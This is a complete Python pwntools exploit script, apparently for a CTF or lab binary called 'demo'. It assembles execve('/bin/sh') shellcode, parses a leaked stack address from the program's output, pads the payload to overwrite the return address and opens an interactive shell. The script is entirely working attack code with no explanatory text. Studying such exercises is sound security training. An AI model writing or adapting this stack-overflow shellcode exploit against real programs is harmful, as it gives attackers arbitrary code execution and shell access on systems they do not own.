from pwn import * 
e = context.binary = ELF("./demo")
r = process(["./demo"])

sc = asm(f"""
    push rax
    xor rdx, rdx 
    xor rsi, rsi
    mov rbx, 0x68732f6e69622f
    push rbx
    push rsp 
    pop rdi 
    mov al, 0x3b 
    syscall
""")
address = int(r.recvlineS().strip().split('0x')[1], 16)
print(hex(address))
pl = sc.ljust(40, b'\0')
# pl += p64(0x00007FFFFFFFE240)
pl += p64(address)

r.sendline(pl)
r.interactive()